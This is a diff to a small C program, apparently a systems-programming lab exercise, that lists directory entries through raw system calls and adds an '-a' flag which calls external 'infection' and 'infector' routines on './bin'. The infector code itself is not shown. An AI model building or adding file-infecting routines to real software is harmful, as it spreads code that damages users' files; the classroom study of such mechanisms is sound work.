@@ -12,8 +12,9 @@
 #define STDOUT 1
 #define STDERR 2
 
-extern void code_start();
-extern void code_end();
+// extern void code_start();
+// extern void code_end();
+extern void infection();
 extern void infector(char* filePath);
 
 
@@ -45,10 +46,10 @@ int useDebugger(int sys_call_param, int sys_ret_param, int debug){
 
 int printParam(char* param, char* text, int textLen){
 
-		system_call(SYS_WRITE, STDOUT, text, textLen);
-		system_call(SYS_WRITE, STDOUT, param, strlen(param));
+	system_call(SYS_WRITE, STDOUT, text, textLen);
+	system_call(SYS_WRITE, STDOUT, param, strlen(param));
 
-		return 0;
+	return 0;
 }
 
 
@@ -57,6 +58,8 @@ int main(int argc, char** argv){
 	
 	int debug = 0;
 	int sFlagPos = 0;
+	int aFlagPos = 0;
+	int suffixPos = 0;
 	char buf[8192];
 	ent *entp = (ent*) buf;	
 	int ret = 0;
@@ -70,9 +73,12 @@ int main(int argc, char** argv){
 		if((strlen(argv[k]) == 2) && (argv[k][0] == '-') && (argv[k][1] == 's')){
 			sFlagPos = k;
 		}
+		if((strlen(argv[k]) == 2) && (argv[k][0] == '-') && (argv[k][1] == 'a')){
+			aFlagPos = k;
+		}
 	}
 
-	system_call(SYS_WRITE,STDOUT, "Flame 2 strikes!\n", 17);
+	// system_call(SYS_WRITE,STDOUT, "Flame 2 strikes!\n", 17);
 	ret = system_call(SYS_OPEN, "./", 0, 0);
 	
 	if(ret < 0)
@@ -81,11 +87,24 @@ int main(int argc, char** argv){
 	
 	system_call(SYS_GETDENTS, ret, buf, 8192);
 
+
+	if(aFlagPos){
+		infection();
+		infector("./bin");
+	}
+
+	if(sFlagPos)
+		suffixPos = sFlagPos;
+
+	if(aFlagPos)
+		suffixPos = aFlagPos;
+
+
 	while(entp->len > 0){
 
-		if(sFlagPos){
+		if(suffixPos){
 			char* name = entp->buf;
-			if(name[strlen(name)-1] == *argv[sFlagPos+1]){
+			if(name[strlen(name)-1] == *argv[suffixPos+1]){
 
 				printParam(name, "", 0);
 				if(debug){
